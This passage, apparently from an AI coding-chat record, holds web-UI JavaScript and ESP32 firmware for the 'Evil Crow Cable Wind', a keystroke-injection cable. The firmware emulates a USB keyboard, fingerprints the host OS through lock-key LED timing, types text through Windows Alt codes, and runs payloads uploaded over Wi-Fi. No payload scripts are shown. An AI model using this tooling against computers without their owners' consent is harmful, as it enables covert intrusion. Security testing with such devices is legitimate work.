cmd.startsWith('LED_'))\n            );\n        }\n\n        function generateCommandSuggestions(commands) {\n            const suggestions = {};\n            commands.forEach(cmd => {\n                for (let i = 2; i <= cmd.length; i++) {\n                    const prefix = cmd.substring(0, i);\n                    const remaining = cmd.substring(i);\n                    if (!suggestions[prefix] || remaining.length < suggestions[prefix].length) {\n                        suggestions[prefix] = remaining;\n                    }\n                }\n            });\n            return suggestions;\n        }\n\n        function updateLineNumbers() {\n            const textarea = document.getElementById('livePayloadInput');\n            const lineNumbers = document.getElementById('lineNumbers');\n            const lines = textarea.value.split('\\n');\n\n            // Get computed styles for accurate measurements\n            const textareaStyle = getComputedStyle(textarea);\n            const lineHeight = parseFloat(textareaStyle.lineHeight);\n            const paddingTop = parseFloat(textareaStyle.paddingTop);\n            const paddingBottom = parseFloat(textareaStyle.paddingBottom);\n\n            // Calculate total height needed\n            const totalHeight = lines.length * lineHeight + paddingTop + paddingBottom;\n\n            // Generate line numbers HTML\n            lineNumbers.innerHTML = Array(lines.length).fill().map((_, i) => \n                `<div style=\"height: ${lineHeight}px; line-height: ${lineHeight}px\">${i + 1}</div>`\n            ).join('');\n\n            // Sync scroll positions\n            lineNumbers.scrollTop = textarea.scrollTop;\n        }\n\n        function validateCurrentLine(e) {\n            const textarea = document.getElementById('livePayloadInput');\n            const validationStatus = document.getElementById('validationStatus');\n            const content = textarea.value.trim();\n        \n            // Always handle auto-suggestion on any input\n            handleAutoSuggestion();\n        \n            // First check if the entire payload is empty\n            if (content === '') {\n                validationStatus.className = 'validation-empty validation-text';\n                validationStatus.textContent = 'Empty payload';\n                validationStatus.title = 'Empty payload';\n                return;\n            }\n        \n            const lines = textarea.value.split('\\n');\n            const currentLineNumber = textarea.value.substr(0, textarea.selectionStart).split('\\n').length;\n            const currentLine = lines[currentLineNumber - 1].trim();\n        \n            // Only validate on certain input events\n            const shouldValidate = e.inputType === 'insertLineBreak' || \n                                e.inputType === 'insertText' || \n                                e.inputType === 'deleteContentBackward';\n        \n            if (!shouldValidate) return;\n        \n            // First validate the current line\n            if (currentLine) {\n                const validationResult = isValidCommandLine(currentLine);\n                if (!validationResult.valid) {\n                    const errorMsg = `Error in line ${currentLineNumber}: ${validationResult.message}`;\n                    validationStatus.className = 'validation-error validation-text';\n                    validationStatus.textContent = errorMsg;\n                    validationStatus.title = errorMsg;\n                    return;\n                }\n            }\n        \n            // If the current line is valid, check for errors in any line of the payload\n            for (let i = 0; i < lines.length; i++) {\n                const line = lines[i].trim();\n                if (!line) continue; // Skip empty lines\n        \n                const validationResult = isValidCommandLine(line);\n                if (!validationResult.valid) {\n                    const errorMsg = `Error in line ${i + 1}: ${validationResult.message}`;\n                    validationStatus.className = 'validation-error validation-text';\n                    validationStatus.textContent = errorMsg;\n                    validationStatus.title = errorMsg;\n                    return;\n                }\n            }\n        \n            // If we get here, the entire payload is valid\n            validationStatus.className = 'validation-ok validation-text';\n            validationStatus.textContent = 'Valid';\n            validationStatus.title = '';\n        }\n\n        function isValidCommandLine(line) {\n            // Special handling for \"# Layout:\" command\n            if (line.startsWith('# Layout:')) {\n                const args = line.substring('# Layout:'.length).trim();\n                return isValidCommand('# Layout:', args, 0);\n            }\n            \n            // Normal command handling\n            const parts = line.split(/\\s+/);\n            const command = parts[0];\n            const args = parts.slice(1).join(' ');\n\n            // Get the line number (for error reporting)\n            const textarea = document.getElementById('livePayloadInput');\n            const lines = textarea.value.split('\\n');\n            const currentLineNumber = textarea.value.substr(0, textarea.selectionStart).split('\\n').length;\n            \n            // Pass command, args, and line number to the validator\n            return isValidCommand(command, args, currentLineNumber);\n        }\n\n        function handleAutoSuggestion() {\n            const textarea = document.getElementById('livePayloadInput');\n            const cursorPos = textarea.selectionStart;\n            const textBeforeCursor = textarea.value.substring(0, cursorPos);\n            const currentLine = textBeforeCursor.split('\\n').pop().trim();\n\n            // Clear any previous suggestion\n            currentSuggestion = null;\n            \n            // Find matching suggestion without showing visual hint\n            for (const [prefix, suggestion] of Object.entries(commandSuggestions)) {\n                if (currentLine === prefix) {\n                    currentSuggestion = suggestion;\n                    return;\n                }\n            }\n        }\n        \n        function handleTabCompletion(e) {\n            if (e.key === 'Tab') {\n                // Always prevent default tab behavior in the textarea\n                e.preventDefault();\n                \n                // Only apply autocompletion if we have a suggestion\n                if (currentSuggestion) {\n                    const textarea = document.getElementById('livePayloadInput');\n                    const cursorPos = textarea.selectionStart;\n                    const textBeforeCursor = textarea.value.substring(0, cursorPos);\n                    const textAfterCursor = textarea.value.substring(cursorPos);\n            \n                    // Insert the suggestion\n                    textarea.value = textBeforeCursor + currentSuggestion + textAfterCursor;\n            \n                    // Move cursor to end of completed command\n                    const newCursorPos = cursorPos + currentSuggestion.length;\n                    textarea.setSelectionRange(newCursorPos, newCursorPos);\n            \n                    // Clean up\n                    currentSuggestion = null;\n            \n                    // Trigger input event\n                    const event = new Event('input');\n                    textarea.dispatchEvent(event);\n                }\n                // If no suggestion exists, the cursor simply stays where it is\n            }\n        }\n\n\n        function checkPayloadStatus(endpoint, toggleId) {\n            fetch(endpoint)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \"executed\") {\n                  document.getElementById(toggleId).checked = false;\n                  clearInterval(toggleIntervals[toggleId]);\n                }\n            })\n            .catch(error => console.error(\"Error checking payload status:\", error));\n        }\n\n        function runPayload() {\n            const validationStatus = document.getElementById('validationStatus');\n            const payloadContent = document.getElementById('livePayloadInput').value;\n\n            // Check for empty payload\n            if (payloadContent.trim() === '') {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before running the payload');\n                return;\n            }\n\n            fetch('/runlivepayload', {\n                method: 'POST',\n                body: new URLSearchParams({ livepayload: payloadContent }),\n            })\n            .then(response => {\n                if (response.ok) return response.text();\n                else throw new Error('Error running payload');\n            })\n            .then(data => {\n                showMessage('success', 'Payload running...');\n                toggleIntervals['togglePayload'] = setInterval(() => {\n                    checkPayloadStatus('/payloadstatuspayload', 'togglePayload');\n                }, 1000);\n            })\n            .catch(error => {\n                showMessage('error', 'Error executing payload.');\n                console.error('Error:', error);\n                toggle.checked = false;\n            });\n        }\n\n        function showSavePayloadForm() {\n            const validationStatus = document.getElementById('validationStatus');\n            const payloadContent = document.getElementById('livePayloadInput').value;\n\n            // Check for empty payload\n            if (payloadContent.trim() === '') {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before saving the payload');\n                return;\n            }\n\n            document.getElementById('metadataForm').style.display = 'block';\n            document.getElementById('metadataForm').scrollIntoView({ behavior: 'smooth' });\n        }\n\n        function cancelSavePayload() {\n            document.getElementById('metadataForm').style.display = 'none';\n        }\n\n        function confirmSavePayload() {\n            const validationStatus = document.getElementById('validationStatus');\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before saving the payload');\n                return;\n            }\n\n            const payloadContent = document.getElementById('livePayloadInput').value;\n            const payloadName = document.getElementById('payloadName').value;\n            const payloadDesc = document.getElementById('payloadDescription').value;\n            const payloadOS = document.getElementById('payloadOS').value;\n\n            // Additional check for empty payload\n            if (!payloadContent) {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            const formData = new FormData();\n            formData.append('livepayload', payloadContent);\n            formData.append('payloadName', payloadName || 'Unnamed Payload');\n            formData.append('payloadDescription', payloadDesc || 'No description provided');\n            formData.append('payloadOS', payloadOS || 'unknown');\n\n            fetch('/runlivesave', {\n                method: 'POST',\n                body: formData\n            })\n            .then(response => {\n                if (response.ok) return response.text();\n                else throw new Error('Error saving payload');\n            })\n            .then(data => {\n                showMessage('success', 'Payload saved successfully!');\n                document.getElementById('metadataForm').style.display = 'none';\n                document.getElementById('payloadName').value = '';\n                document.getElementById('payloadDescription').value = '';\n                document.getElementById('payloadOS').value = '';\n            })\n            .catch(error => {\n                showMessage('error', 'Error saving payload.');\n                console.error('Error:', error);\n            });\n        }\n\n        function showMessage(type, text) {\n            const container = document.getElementById('global-toast');\n            const toast = document.createElement('div');\n            toast.className = `toast-message ${type}`;\n\n            const messageSpan = document.createElement('span');\n            messageSpan.textContent = text;\n\n            const closeButton = document.createElement('span');\n            closeButton.className = 'toast-close';\n            closeButton.innerHTML = '&times;';\n            closeButton.onclick = () => {\n                toast.style.animation = 'toastFadeOut 0.3s ease-out';\n                setTimeout(() => toast.remove(), 300);\n            };\n\n            toast.appendChild(messageSpan);\n            toast.appendChild(closeButton);\n            container.appendChild(toast);\n\n            // Auto-remove after 5 seconds\n            const timer = setTimeout(() => {\n                toast.style.animation = 'toastFadeOut 0.3s ease-out';\n                setTimeout(() => toast.remove(), 300);\n            }, 5000);\n\n            // Update close handler to also clear the timer\n            closeButton.onclick = () => {\n                clearTimeout(timer);\n                toast.style.animation = 'toastFadeOut 0.3s ease-out';\n                setTimeout(() => toast.remove(), 300);\n            };\n        }\n\n        // Initialize when page loads\n        document.addEventListener('DOMContentLoaded', function() {\n            updateLineNumbers();\n\n            setTimeout(() => {\n                updateLineNumbers();\n            }, 100);\n\n            validatePayload();\n\n            // Setup text area event handlers\n            const payloadInput = document.getElementById('livePayloadInput');\n\n            // Input event for content changes, validation, and line numbers\n            payloadInput.addEventListener('input', function(e) {\n                updateLineNumbers();\n                validatePayload();\n                validateCurrentLine(e);\n                handleAutoSuggestion();\n            });\n\n            // Key events for tab completion\n            payloadInput.addEventListener('keydown', handleTabCompletion);\n\n            // Scroll event for line number sync - improved\n            payloadInput.addEventListener('scroll', function() {\n                const lineNumbers = document.getElementById('lineNumbers');\n                lineNumbers.scrollTop = this.scrollTop;\n            });\n            // Clear current suggestion on blur\n            payloadInput.addEventListener('blur', function() {\n                currentSuggestion = null;\n            });\n\n            // Command cell click handlers\n            document.querySelectorAll('.command-cell').forEach(cell => {\n                cell.addEventListener('click', function() {\n                    const textarea = document.getElementById('livePayloadInput');\n                    const command = this.textContent;\n\n                    if (textarea.value === '') {\n                        textarea.value = command;\n                    } else {\n                        if (textarea.value.slice(-1) !== '\\n') { \n                            textarea.value += '\\n';\n                        }\n                        textarea.value += command;\n                    }\n\n                    textarea.focus();\n                    textarea.scrollTop = textarea.scrollHeight;\n\n                    this.style.backgroundColor = 'rgba(0, 242, 255, 0.3)';\n                    setTimeout(() => {\n                        this.style.backgroundColor = '';\n                    }, 300);\n                });\n\n                cell.style.cursor = 'pointer';\n            });\n        });\n\n        if (window.location.search.includes('edit=true')) {\n            const editPayloadContent = localStorage.getItem('editPayloadContent');\n            const editPayloadPath = localStorage.getItem('editPayloadPath')\n            if (editPayloadContent && editPayloadPath) {\n                document.getElementById('livePayloadInput').value = editPayloadContent;\n                updateLineNumbers();\n                validatePayload()\n                // Modify the save button to update existing payload\n                document.querySelector('button[onclick=\"showSavePayloadForm()\"]').textContent = 'Save Changes';\n                document.querySelector('button[onclick=\"showSavePayloadForm()\"]').onclick = function() {\n                    updateExistingPayload(editPayloadPath);\n                }\n                // Clean up localStorage\n                localStorage.removeItem('editPayloadContent');\n                localStorage.removeItem('editPayloadPath');\n            }\n        }\n        \n        function updateExistingPayload(filePath) {\n            const validationStatus = document.getElementById('validationStatus');\n            const payloadContent = document.getElementById('livePayloadInput').value;\n\n            // Check for empty payload\n            if (payloadContent.trim() === '') {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before saving changes');\n                return;\n            }\n\n            fetch('/updatepayload', {\n                method: 'POST',\n                headers: { 'Content-Type': 'application/json' },\n                body: JSON.stringify({ \n                    path: filePath, \n                    content: payloadContent \n                })\n            })\n            .then(handleUpdateResponse)\n            .catch(handleUpdateError);\n        }\n\n        function handleUpdateResponse(response) {\n            if (!response.ok) {\n                return response.text().then(text => { throw new Error(text) });\n            }\n            return response.json().then(data => {\n                if (data.success) {\n                    showMessage('success', 'Payload updated successfully!');\n                } else {\n                    showMessage('error', data.message || 'Update failed');\n                }\n            });\n        }\n\n        function handleUpdateError(error) {\n            console.error('Update error:', error);\n            showMessage('error', `Update failed: ${error.message}`);\n        }\n    </script>\n</body>\n</html>\n)=====\";"
    }
  ],
  "system_message": "You are a helpful assistant. Provide clear and concise answers. If you are writing a code make sure to summarize and provide a concise code, optimize the code output to the smartest and the shortest way with better readability and functionality\n\nDefault Prompt:\n{\"prompt\": \"\"}\n\nGrouped Files Context:\nGroup: firmware\nContent:\n#include <WiFiClient.h>\n#include <WiFi.h>\n#include <ESPmDNS.h>\n#include <WiFiServer.h>\n#include <WebServer.h>\n#include <LittleFS.h>\n#include <HTTPUpdateServer.h>\n#include \"USB.h\"\n#include \"USBHIDKeyboard.h\"\n#include \"index.h\"\n#include \"livepayload.h\"\n#include \"uploadpayload.h\"\n#include \"style.h\"\n#include \"javascript.h\"\n#include \"config.h\"\n#include \"readfile.h\"\n#include \"listpayloads.h\"\n#include \"autoexecplanning.h\"\n#include <ArduinoJson.h>\n#include <map>\n\n// Config default SSID, password and channel\nString ssid = \"Evil Crow Cable Wind\";  // Enter your SSID here\nString password = \"123456789\";         //Enter your Password here\nchar *serverIP;\nint serverPort = 4444;\n// WiFi monitoring variables\nunsigned long lastWifiCheckTime = 0;\nconst unsigned long wifiCheckInterval = 60000; // 1 minute\nbool wifiConnected = false;\n\n// Global variables\nString cmd;\nchar Command[255];\nString tmp_key;\nint payload_state = 0;\nString livepayload;\nbool payloadExecuted = false;\nconst bool formatOnFail = true;\nString FileName;\nString FileList;\nString vendorID, productID, manufacturerName, productName;\nString os;\nvolatile bool led_response_received = false;\nvolatile int led_event_count = 0;\nvolatile unsigned long led_event_time = 0;\nvolatile bool caps_status = false;\nvolatile bool num_status = false;\nvolatile bool scroll_status = false;\nvolatile bool numlock_checked = false;\nvolatile bool os_detection_complete = false;\nunsigned long caps_sent_time = 0;\nunsigned long num_sent_time = 0;\nunsigned long scroll_sent_time = 0;\nunsigned long caps_delay = 0;\nunsigned long num_delay = 0;\nunsigned long scroll_delay = 0;\nconst unsigned char *selected_layout = en_us;  // Default to EN_US\n\nFile fsUploadFile;\nWebServer controlserver(80);\nWiFiServer tcpServer(12345);\nWiFiClient clientServer;\nHTTPUpdateServer httpUpdater;\nUSBCDC USBSerial;\nUSBHIDKeyboard Keyboard;\n\nenum HostOS {\n  OS_UNKNOWN,\n  OS_WINDOWS,\n  OS_LINUX,\n  OS_MACOS,\n  OS_IOS,\n  OS_ANDROID\n};\n\nenum MetadataField {\n    META_NAME,\n    META_DESCRIPTION,\n    META_OS\n};\n\nHostOS detected_os = OS_UNKNOWN;\n\nextern const unsigned char en_us[128];\nextern const unsigned char es_es[128];\nextern const unsigned char fr_fr[128];\nextern const unsigned char it_it[128];\nextern const unsigned char da_dk[128];\nextern const unsigned char de_de[128];\nextern const unsigned char hr_hr[128];\nextern const unsigned char hu_hu[128];\nextern const unsigned char pt_pt[128];\nextern const unsigned char pt_br[128];\nextern const unsigned char be_be[128];\nextern const unsigned char br_br[128];\nextern const unsigned char ca_ca[128];\nextern const unsigned char ca_fr[128];\nextern const unsigned char sk_sk[128];\nextern const unsigned char cz_cz[128];\nextern const unsigned char sv_se[128];\nextern const unsigned char si_si[128];\n\nstd::map<String, const unsigned char *> layoutMapInit = {\n  { \"EN_US\", en_us },\n  { \"ES_ES\", es_es },\n  { \"FR_FR\", fr_fr },\n  { \"IT_IT\", it_it },\n  { \"DA_DK\", da_dk },\n  { \"DE_DE\", de_de },\n  { \"HR_HR\", hr_hr },\n  { \"HU_HU\", hu_hu },\n  { \"PT_PT\", pt_pt },\n  { \"PT_BR\", pt_br },\n  { \"BE_BE\", be_be },\n  { \"BR_BR\", br_br },\n  { \"CA_CA\", ca_ca },\n  { \"CA_FR\", ca_fr },\n  { \"SK_SK\", sk_sk },\n  { \"CZ_CZ\", cz_cz },\n  { \"SV_SE\", sv_se },\n  { \"SI_SI\", si_si },\n};\n\nstd::map<String, uint8_t> keyMap = {\n  { \"KEY_LEFT_ALT\", KEY_LEFT_ALT },\n  { \"KEY_LEFT_GUI\", KEY_LEFT_GUI },\n  { \"KEY_LEFT_CTRL\", KEY_LEFT_CTRL },\n  { \"KEY_LEFT_SHIFT\", KEY_LEFT_SHIFT },\n  { \"KEY_RIGHT_ALT\", KEY_RIGHT_ALT },\n  { \"KEY_RIGHT_GUI\", KEY_RIGHT_GUI },\n  { \"KEY_RIGHT_CTRL\", KEY_RIGHT_CTRL },\n  { \"KEY_RIGHT_SHIFT\", KEY_RIGHT_SHIFT },\n  { \"KEY_ENTER\", KEY_RETURN },\n  { \"KEY_UP_ARROW\", KEY_UP_ARROW },\n  { \"KEY_DOWN_ARROW\", KEY_DOWN_ARROW },\n  { \"KEY_LEFT_ARROW\", KEY_LEFT_ARROW },\n  { \"KEY_RIGHT_ARROW\", KEY_RIGHT_ARROW },\n  { \"KEY_BACKSPACE\", KEY_BACKSPACE },\n  { \"KEY_TAB\", KEY_TAB },\n  { \"KEY_PAUSE\", KEY_PAUSE },\n  { \"KEY_INSERT\", KEY_INSERT },\n  { \"KEY_DELETE\", KEY_DELETE },\n  { \"KEY_PAGE_UP\", KEY_PAGE_UP },\n  { \"KEY_PAGE_DOWN\", KEY_PAGE_DOWN },\n  { \"KEY_ESC\", KEY_ESC },\n  { \"KEY_SPACE\", KEY_SPACE },\n  { \"KEY_HOME\", KEY_HOME },\n  { \"KEY_END\", KEY_END },\n  { \"KEY_CAPS_LOCK\", KEY_CAPS_LOCK },\n  { \"KEY_PRINT_SCREEN\", KEY_PRINT_SCREEN },\n  { \"KEY_SCROLL_LOCK\", KEY_SCROLL_LOCK },\n  { \"KEY_NUM_LOCK\", KEY_NUM_LOCK },\n  { \"KEY_MENU\", KEY_MENU },\n  { \"LED_NUMLOCK\", LED_NUMLOCK },\n  { \"LED_CAPSLOCK\", LED_CAPSLOCK },\n  { \"LED_SCROLLLOCK\", LED_SCROLLLOCK },\n  { \"LED_COMPOSE\", LED_COMPOSE },\n  { \"LED_KANA\", LED_KANA },\n  { \"KEY_F1\", KEY_F1 },\n  { \"KEY_F2\", KEY_F2 },\n  { \"KEY_F3\", KEY_F3 },\n  { \"KEY_F4\", KEY_F4 },\n  { \"KEY_F5\", KEY_F5 },\n  { \"KEY_F6\", KEY_F6 },\n  { \"KEY_F7\", KEY_F7 },\n  { \"KEY_F8\", KEY_F8 },\n  { \"KEY_F9\", KEY_F9 },\n  { \"KEY_F10\", KEY_F10 },\n  { \"KEY_F11\", KEY_F11 },\n  { \"KEY_F12\", KEY_F12 }\n};\n\nvoid usbEventCallback(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {\n  if (event_base == ARDUINO_USB_HID_KEYBOARD_EVENTS) {\n    arduino_usb_hid_keyboard_event_data_t *data = (arduino_usb_hid_keyboard_event_data_t *)event_data;\n\n    if (event_id == ARDUINO_USB_HID_KEYBOARD_LED_EVENT) {\n      led_response_received = true;\n      led_event_count++;\n      led_event_time = millis();\n\n      caps_status = data->capslock != 0;\n      num_status = data->numlock != 0;\n      scroll_status = data->scrolllock != 0;\n      numlock_checked = true;\n\n      if (caps_sent_time > 0 && caps_delay == 0)\n        caps_delay = led_event_time - caps_sent_time;\n      if (num_sent_time > 0 && num_delay == 0)\n        num_delay = led_event_time - num_sent_time;\n      if (scroll_sent_time > 0 && scroll_delay == 0)\n        scroll_delay = led_event_time - scroll_sent_time;\n    }\n  }\n}\n\nvoid ensureNumLock() {\n  if (!numlock_checked) {\n    return;\n  }\n  if (!num_status) {\n    Keyboard.press(KEY_NUM_LOCK);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n}\n\nconst char *ascii_convert(char c) {\n  static char buffer[4];\n  if (c >= 32 && c <= 126) {\n    snprintf(buffer, sizeof(buffer), \"%d\", c);\n    return buffer;\n  }\n  return \"000\";\n}\n\nvoid writeLetterWindows(const char *asciiCode) {\n  Keyboard.press(KEY_LEFT_ALT);\n\n  for (int i = 0; asciiCode[i] != '\\0'; i++) {\n    switch (asciiCode[i]) {\n      case '0':\n        Keyboard.press(KEY_KP_0);\n        delay(2);\n        Keyboard.release(KEY_KP_0);\n        break;\n      case '1':\n        Keyboard.press(KEY_KP_1);\n        delay(2);\n        Keyboard.release(KEY_KP_1);\n        break;\n      case '2':\n        Keyboard.press(KEY_KP_2);\n        delay(2);\n        Keyboard.release(KEY_KP_2);\n        break;\n      case '3':\n        Keyboard.press(KEY_KP_3);\n        delay(2);\n        Keyboard.release(KEY_KP_3);\n        break;\n      case '4':\n        Keyboard.press(KEY_KP_4);\n        delay(2);\n        Keyboard.release(KEY_KP_4);\n        break;\n      case '5':\n        Keyboard.press(KEY_KP_5);\n        delay(2);\n        Keyboard.release(KEY_KP_5);\n        break;\n      case '6':\n        Keyboard.press(KEY_KP_6);\n        delay(2);\n        Keyboard.release(KEY_KP_6);\n        break;\n      case '7':\n        Keyboard.press(KEY_KP_7);\n        delay(2);\n        Keyboard.release(KEY_KP_7);\n        break;\n      case '8':\n        Keyboard.press(KEY_KP_8);\n        delay(2);\n        Keyboard.release(KEY_KP_8);\n        break;\n      case '9':\n        Keyboard.press(KEY_KP_9);\n        delay(2);\n        Keyboard.release(KEY_KP_9);\n        break;\n    }\n  }\n  Keyboard.release(KEY_LEFT_ALT);\n  delay(5);\n}\n\nvoid writeLineWindows(const char *str) {\n  ensureNumLock();\n\n  while (*str) {\n    const char *code = ascii_convert(*str);\n    writeLetterWindows(code);\n    str++;\n    delay(2);\n  }\n  Keyboard.press(KEY_NUM_LOCK);\n  delay(100);\n  Keyboard.releaseAll();\n}\n\nvoid toggleKey(uint8_t key, unsigned long *send_time) {\n  *send_time = millis();\n  led_response_received = false;\n\n  Keyboard.press(key);\n  delay(300);\n  Keyboard.release(key);\n  delay(800);\n}\n\nvoid resetKeyboardLEDs() {\n  unsigned long temp_time;\n  delay(500);\n  if (caps_status) {\n    toggleKey(KEY_CAPS_LOCK, &temp_time);\n    delay(800);\n  }\n  if (num_status) {\n    toggleKey(KEY_NUM_LOCK, &temp_time);\n    delay(800);\n  }\n  if (scroll_status) {\n    toggleKey(KEY_SCROLL_LOCK, &temp_time);\n    delay(800);\n  }\n}\n\nvoid detectHostOS() {\n  led_event_count = 0;\n  caps_status = num_status = scroll_status = 0;\n  caps_delay = num_delay = scroll_delay = 0;\n  caps_sent_time = num_sent_time = scroll_sent_time = 0;\n  led_response_received = false;\n  uint8_t initial_caps = caps_status;\n  toggleKey(KEY_CAPS_LOCK, &caps_sent_time);\n  delay(1500);\n\n  if (!led_response_received && caps_status != initial_caps) {\n    detected_os = OS_IOS;\n    return;\n  }\n\n  toggleKey(KEY_NUM_LOCK, &num_sent_time);\n  delay(1200);\n  toggleKey(KEY_SCROLL_LOCK, &scroll_sent_time);\n  delay(1200);\n\n  if (led_event_count == 0) {\n    detected_os = (caps_status != initial_caps) ? OS_IOS : OS_MACOS;\n  } else if (led_event_count >= 3 && caps_delay < 100 && num_delay < 100 && scroll_delay < 100) {\n    detected_os = OS_WINDOWS;\n  } else {\n    bool has_numlock_response = (num_delay > 0);\n    bool has_scrolllock_response = (scroll_delay > 0);\n\n    if (num_status && !scroll_status && has_numlock_response && !has_scrolllock_response) {\n      detected_os = OS_LINUX;\n    } else if ((caps_delay > 200 || num_delay > 200 || scroll_delay > 200) && (has_numlock_response || has_scrolllock_response)) {\n      detected_os = OS_ANDROID;\n    } else if (caps_status != initial_caps) {\n      detected_os = OS_IOS;\n    } else {\n      detected_os = OS_UNKNOWN;\n    }\n  }\n}\n\nvoid printDetectedOS() {\n  switch (detected_os) {\n    case OS_WINDOWS:\n      os = \"Windows\";\n      break;\n    case OS_LINUX:\n      os = \"Linux\";\n      break;\n    case OS_MACOS:\n      os = \"macOS\";\n      break;\n    case OS_IOS:\n      os = \"iOS\";\n      break;\n    case OS_ANDROID:\n      os = \"Android\";\n      break;\n    default:\n      os = \"OS Unknown\";\n      break;\n  }\n  os_detection_complete = true;\n}\n\nvoid onDetectOSRequested() {\n  resetKeyboardLEDs();\n  detectHostOS();\n  resetKeyboardLEDs();\n  printDetectedOS();\n}\n\nvoid deleteFile(fs::FS &fs, const String &path) {\n  // Delete the main payload file\n  bool payloadDeleted = fs.remove(path);\n\n  // Delete the corresponding meta file\n  String metaPath = path;\n  metaPath += \".meta\";\n  bool metaDeleted = fs.remove(metaPath);\n\n  if (payloadDeleted) {\n    controlserver.send(200, \"text/plain\", \"File deleted successfully\");\n  } else {\n    controlserver.send(500, \"text/plain\", \"Failed to delete file\");\n  }\n}\n\nvoid readFile(fs::FS &fs, const String &path) {\n  String payloadContent = \"\";\n  String payloadDescription = readPayloadMetadata(path, META_DESCRIPTION);\n\n  File file = fs.open(path);\n  if (!file || file.isDirectory()) {\n    FileList = \"Failed to open file\";\n    return;\n  }\n  while (file.available()) {\n    payloadContent += file.readString();\n  }\n  file.close();\n\n  if (path == \"\") {\n    FileList = \"File name is empty\";\n    return;\n  }\n\n  // Set layout based on payload content\n  setLayoutFromPayload(payloadContent);\n\n  livepayload = payloadContent;\n  \n  FileList = StaticFileList;\n  FileList.replace(\"{{path}}\", path);\n  FileList.replace(\"{{payloadContent}}\", payloadContent);\n  FileList.replace(\"{{payloadDescription}}\", payloadDescription);\n}\n\n\n// Helper function to save payload metadata\nvoid savePayloadMetadata(const String &filename, const String &name, const String &description, const String &os) {\n  String metaPath = filename + \".meta\";\n  File metaFile = LittleFS.open(metaPath, FILE_WRITE);\n  if (metaFile) {\n    // Write name (first line) - create a local copy to trim\n    String trimmedName = name;\n    trimmedName.trim();\n    metaFile.println(trimmedName);\n\n    // Write osType - to filter the listpayloads\n    String trimmedOS = os;\n    trimmedOS.trim();\n    metaFile.println(trimmedOS);\n\n    // Write description - trim and clean up line endings\n    String cleanDesc = description;\n    cleanDesc.trim(); // Trim both ends\n    cleanDesc.replace(\"\\r\\n\", \"\\n\"); // Normalize line endings\n    metaFile.print(cleanDesc); // Don't add extra newline at end\n\n    metaFile.close();\n  }\n}\n\n// Helper function to read payload metadata\nString readPayloadMetadata(const String &filename, MetadataField field) {\n    String metaPath = filename + \".meta\";\n\n    if (!LittleFS.exists(metaPath)) {\n        if (field == META_NAME) {\n            int lastSlash = filename.lastIndexOf('/');\n            return filename.substring(lastSlash + 1);\n        } else if (field == META_DESCRIPTION) {\n            return \"No description\";\n        } else {\n            return \"unknown\";\n        }\n    }\n\n    File metaFile = LittleFS.open(metaPath, FILE_READ);\n    if (!metaFile) {\n        if (field == META_NAME) {\n            int lastSlash = filename.lastIndexOf('/');\n            return filename.substring(lastSlash + 1);\n        } else if (field == META_DESCRIPTION) {\n            return \"No description\";\n        } else {\n            return \"unknown\";\n        }\n    }\n\n    String lines[3];  // name, os, description\n    for (int i = 0; i < 3 && metaFile.available(); i++) {\n        if (i == 2) { // Description field\n            String desc;\n            while (metaFile.available()) {\n                desc += metaFile.readString();\n            }\n            desc.trim(); // Ensure no leading/trailing whitespace\n            lines[i] = desc;\n        } else {\n            lines[i] = metaFile.readStringUntil('\\n');\n            lines[i].trim();\n        }\n    }\n\n    metaFile.close();\n\n    switch (field) {\n        case META_NAME:\n            return lines[0].length() > 0 ? lines[0] : filename.substring(filename.lastIndexOf('/') + 1);\n        case META_OS:\n            return lines[1].length() > 0 ? lines[1] : \"unknown\";\n        case META_DESCRIPTION:\n            return lines[2].length() > 0 ? lines[2] : \"No description\";\n        default:\n            return \"\";\n    }\n}\n\nvoid handleUpdatePayload() {\n    if (controlserver.hasArg(\"plain\")) {\n        DynamicJsonDocument doc(1024);\n        DeserializationError error = deserializeJson(doc, controlserver.arg(\"plain\"));\n\n        if (error) {\n            controlserver.send(400, \"application/json\", \n                \"{\\\"success\\\":false,\\\"message\\\":\\\"Invalid JSON\\\"}\");\n            return;\n        }\n\n        String path = doc[\"path\"] | \"\";\n        String content = doc[\"content\"] | \"\";\n\n        if (path.isEmpty() || content.isEmpty()) {\n            controlserver.send(400, \"application/json\", \n                \"{\\\"success\\\":false,\\\"message\\\":\\\"Missing path or content\\\"}\");\n            return;\n        }\n\n        File file = LittleFS.open(path, \"w\");\n        if (!file) {\n            controlserver.send(500, \"application/json\", \n                \"{\\\"success\\\":false,\\\"message\\\":\\\"Failed to open file\\\"}\");\n            return;\n        }\n\n        file.print(content);\n        file.close();\n        controlserver.send(200, \"application/json\", \n            \"{\\\"success\\\":true,\\\"message\\\":\\\"Payload updated\\\"}\");\n    } else {\n        controlserver.send(400, \"application/json\", \n            \"{\\\"success\\\":false,\\\"message\\\":\\\"No data received\\\"}\");\n    }\n}\n\n// Updated handleFileUpload\nvoid handleFileUpload() {\n  HTTPUpload &upload = controlserver.upload();\n  static const uint32_t MAX_FILE_SIZE = 204800;  // 200KB limit\n  static uint32_t totalUploaded = 0;\n  static String payloadName, payloadDescription, fileName, payloadOS;\n\n  if (upload.status == UPLOAD_FILE_START) {\n    totalUploaded = 0;\n    payloadName = controlserver.arg(\"payloadName\");\n    payloadDescription = controlserver.arg(\"payloadDescription\");\n    payloadOS = controlserver.arg(\"payloadOS\");\n\n    fileName = upload.filename;\n\n    if (!fileName.endsWith(\".txt\")) {\n      controlserver.send(400, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Only .txt files allowed\\\"}\");\n      return;\n    }\n\n    if (!fileName.startsWith(\"/\")) {\n      fileName = String(\"/payloads/\") + fileName;\n    }\n\n    if (!LittleFS.exists(\"/payloads\")) {\n      LittleFS.mkdir(\"/payloads\");\n    }\n\n    